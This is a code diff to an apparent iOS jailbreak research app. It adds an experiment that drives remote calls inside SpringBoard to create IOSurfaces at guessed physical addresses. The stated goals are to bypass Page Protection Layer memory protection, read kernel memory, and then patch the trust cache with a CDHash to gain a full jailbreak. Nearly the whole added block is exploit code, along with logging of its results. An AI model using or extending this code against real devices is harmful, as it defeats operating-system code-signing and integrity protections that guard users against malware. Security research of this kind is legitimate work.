@@ -245,6 +245,13 @@ struct AMFIExperimentView: View {
             let exp67 = self.expCredMgrDeepFuzz()
             experimentResults.append(exp67)
             
+            // ============================================
+            // Experiment 68: PPL Bypass via IOSurface Physical Memory
+            // Map physical page from SpringBoard → bypass PPL virtual protection
+            // ============================================
+            let exp68 = self.expPPLPhysicalBypass()
+            experimentResults.append(exp68)
+            
             DispatchQueue.main.async {
                 self.results = experimentResults
                 self.isRunning = false
@@ -2252,6 +2259,179 @@ struct AMFIExperimentView: View {
         
         let success = !findings.isEmpty
         return ExperimentResult(name: "CredMgr Deep Fuzz", success: success, detail: detail, timestamp: Date())
+    }
+    
+    // MARK: - Experiment 68: PPL Bypass via IOSurface Physical Memory
+    
+    /// PPL protects VIRTUAL memory mappings. But IOSurface can map PHYSICAL memory.
+    /// If we map the same physical page that backs trust cache → bypass PPL!
+    /// From SpringBoard: create IOSurface with IOSurfaceAddress = physical addr
+    /// A12 PPL is software-only (no HVC/SMC) → physical mapping might bypass it
+    private func expPPLPhysicalBypass() -> ExperimentResult {
+        guard let sb = dspmgr.shared.sbProc else {
+            return ExperimentResult(name: "PPL Physical Bypass", success: false, detail: "No SB RC", timestamp: Date())
+        }
+        
+        let mem = sb.trojanMem
+        let mgr = dspmgr.shared
+        var detail = "PPL Bypass via IOSurface Physical Memory\n\n"
+        
+        let RTLD_DEFAULT = UInt64(bitPattern: -2)
+        
+        // Step 1: Get IOSurface functions
+        let ioCreate = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOSurfaceCreate"))
+        let ioGetBase = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOSurfaceGetBaseAddress"))
+        let ioLock = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOSurfaceLock"))
+        let ioUnlock = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOSurfaceUnlock"))
+        let ioPrefetch = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOSurfacePrefetchPages"))
+        
+        detail += "IOSurfaceCreate: \(ioCreate != 0 ? "found" : "missing")\n"
+        detail += "IOSurfaceGetBaseAddress: \(ioGetBase != 0 ? "found" : "missing")\n"
+        
+        guard ioCreate != 0 && ioGetBase != 0 else {
+            detail += "IOSurface functions not available\n"
+            return ExperimentResult(name: "PPL Physical Bypass", success: false, detail: detail, timestamp: Date())
+        }
+        
+        // Step 2: Create normal IOSurface first (get a known physical mapping)
+        detail += "\n=== Step 2: Create reference IOSurface ===\n"
+        let nsDictClass = remote_getClass(sb, "NSMutableDictionary")
+        let nsNumClass = remote_getClass(sb, "NSNumber")
+        let numWithInt = remote_sel(sb, "numberWithInteger:")
+        let dictNew = remote_sel(sb, "new")
+        let setObj = remote_sel(sb, "setObject:forKey:")
+        
+        let dict = remote_msg(sb, nsDictClass, dictNew, 0, 0, 0, 0)
+        remote_msg(sb, dict, setObj, remote_msg(sb, nsNumClass, numWithInt, 0x4000, 0, 0, 0), remote_NSString(sb, "IOSurfaceAllocSize"), 0, 0)
+        remote_msg(sb, dict, setObj, remote_msg(sb, nsNumClass, numWithInt, 64, 0, 0, 0), remote_NSString(sb, "IOSurfaceWidth"), 0, 0)
+        remote_msg(sb, dict, setObj, remote_msg(sb, nsNumClass, numWithInt, 64, 0, 0, 0), remote_NSString(sb, "IOSurfaceHeight"), 0, 0)
+        remote_msg(sb, dict, setObj, remote_msg(sb, nsNumClass, numWithInt, 4, 0, 0, 0), remote_NSString(sb, "IOSurfaceBytesPerElement"), 0, 0)
+        
+        let refSurface = RootExecutor.rcall(sb, "IOSurfaceCreate", dict)
+        detail += "Reference surface: 0x\(String(format: "%llx", refSurface))\n"
+        
+        guard refSurface != 0 else {
+            detail += "Cannot create reference surface\n"
+            return ExperimentResult(name: "PPL Physical Bypass", success: false, detail: detail, timestamp: Date())
+        }
+        
+        RootExecutor.rcall(sb, "IOSurfaceLock", refSurface, 0, 0)
+        let refBase = RootExecutor.rcall(sb, "IOSurfaceGetBaseAddress", refSurface)
+        detail += "Reference base addr: 0x\(String(format: "%llx", refBase))\n"
+        
+        // Write marker to reference surface
+        if refBase != 0 {
+            sb[refBase].setValue64(0xDEAD_BEEF_CAFE_BABE)
+            let readBack = sb[refBase].value64()
+            detail += "Marker write/read: 0x\(String(format: "%llx", readBack))\n"
+        }
+        RootExecutor.rcall(sb, "IOSurfaceUnlock", refSurface, 0, 0)
+        
+        // Step 3: Try IOSurface with IOSurfaceAddress (physical address mapping)
+        detail += "\n=== Step 3: IOSurface with physical address ===\n"
+        
+        // Try various physical addresses:
+        // - 0x800000000 = typical DRAM base on A12
+        // - kernel_base physical = kernel_base - gVirtBase + gPhysBase
+        // We don't know exact gPhysBase, but typical values:
+        // A12: gPhysBase ~ 0x800000000, gVirtBase ~ 0xfffffff007004000
+        
+        let kernBase = mgr.kernbase
+        // Estimate physical address of kernel (rough)
+        // On A12, phys = virt - 0xfffffff007004000 + 0x800000000 (approximate)
+        let estimatedPhysKern = kernBase - 0xfffffff007004000 + 0x800000000
+        
+        let testAddresses: [(String, UInt64)] = [
+            ("DRAM base (0x800000000)", 0x800000000),
+            ("DRAM +1MB", 0x800100000),
+            ("DRAM +16MB", 0x801000000),
+            ("Estimated kernel phys", estimatedPhysKern),
+            ("Zero (should fail)", 0),
+        ]
+        
+        var anyMapped = false
+        
+        for (name, physAddr) in testAddresses {
+            // Create dict with IOSurfaceAddress
+            let addrDict = remote_msg(sb, nsDictClass, dictNew, 0, 0, 0, 0)
+            remote_msg(sb, addrDict, setObj, remote_msg(sb, nsNumClass, numWithInt, 0x4000, 0, 0, 0), remote_NSString(sb, "IOSurfaceAllocSize"), 0, 0)
+            
+            // Set IOSurfaceAddress = physical address
+            // NSNumber with UInt64 value
+            let physNum = remote_msg(sb, nsNumClass, remote_sel(sb, "numberWithUnsignedLongLong:"), physAddr, 0, 0, 0)
+            remote_msg(sb, addrDict, setObj, physNum, remote_NSString(sb, "IOSurfaceAddress"), 0, 0)
+            
+            let surface = RootExecutor.rcall(sb, "IOSurfaceCreate", addrDict)
+            
+            if surface != 0 {
+                // Surface created! Try to get base address
+                RootExecutor.rcall(sb, "IOSurfaceLock", surface, 0, 0)
+                
+                if ioPrefetch != 0 {
+                    RootExecutor.rcall(sb, "IOSurfacePrefetchPages", surface)
+                }
+                
+                let baseAddr = RootExecutor.rcall(sb, "IOSurfaceGetBaseAddress", surface)
+                
+                if baseAddr != 0 {
+                    detail += "  \(name): MAPPED! base=0x\(String(format: "%llx", baseAddr))\n"
+                    anyMapped = true
+                    
+                    // Try to read from mapped physical memory
+                    let val = sb[baseAddr].value64()
+                    detail += "    Read: 0x\(String(format: "%016llx", val))\n"
+                    
+                    // Check if this looks like kernel memory
+                    if val == 0x100000CFEEDFACF || (val & 0xFFFF000000000000) == 0xFFFF000000000000 {
+                        detail += "    KERNEL DATA DETECTED!\n"
+                        detail += "    PPL BYPASS VIA PHYSICAL MEMORY!\n"
+                    }
+                } else {
+                    detail += "  \(name): surface created but base=NULL\n"
+                }
+                
+                RootExecutor.rcall(sb, "IOSurfaceUnlock", surface, 0, 0)
+            } else {
+                detail += "  \(name): create FAILED (rejected)\n"
+            }
+        }
+        
+        // Step 4: Alternative — use IOSurfaceMemoryRegion = "PurpleGfxMem"
+        detail += "\n=== Step 4: PurpleGfxMem region ===\n"
+        let gfxDict = remote_msg(sb, nsDictClass, dictNew, 0, 0, 0, 0)
+        remote_msg(sb, gfxDict, setObj, remote_msg(sb, nsNumClass, numWithInt, 0x4000, 0, 0, 0), remote_NSString(sb, "IOSurfaceAllocSize"), 0, 0)
+        remote_msg(sb, gfxDict, setObj, remote_NSString(sb, "PurpleGfxMem"), remote_NSString(sb, "IOSurfaceMemoryRegion"), 0, 0)
+        
+        let gfxSurface = RootExecutor.rcall(sb, "IOSurfaceCreate", gfxDict)
+        detail += "PurpleGfxMem surface: 0x\(String(format: "%llx", gfxSurface))\n"
+        
+        if gfxSurface != 0 {
+            RootExecutor.rcall(sb, "IOSurfaceLock", gfxSurface, 0, 0)
+            let gfxBase = RootExecutor.rcall(sb, "IOSurfaceGetBaseAddress", gfxSurface)
+            detail += "PurpleGfxMem base: 0x\(String(format: "%llx", gfxBase))\n"
+            
+            if gfxBase != 0 {
+                detail += "PurpleGfxMem MAPPED! This is physically contiguous memory.\n"
+                detail += "Can be used for physical memory scanning.\n"
+                anyMapped = true
+            }
+            RootExecutor.rcall(sb, "IOSurfaceUnlock", gfxSurface, 0, 0)
+        }
+        
+        // Summary
+        detail += "\n=== RESULTS ===\n"
+        if anyMapped {
+            detail += "Physical memory mapping ACHIEVED!\n"
+            detail += "Next: scan mapped memory for trust cache patterns\n"
+            detail += "Then: write CDHash to trust cache → full jailbreak!\n"
+        } else {
+            detail += "All physical mapping attempts failed.\n"
+            detail += "IOSurfaceAddress rejected from SpringBoard context.\n"
+            detail += "PPL physical bypass NOT possible via this method.\n"
+        }
+        
+        let success = anyMapped
+        return ExperimentResult(name: "PPL Physical Bypass", success: success, detail: detail, timestamp: Date())
     }
     
     #endif
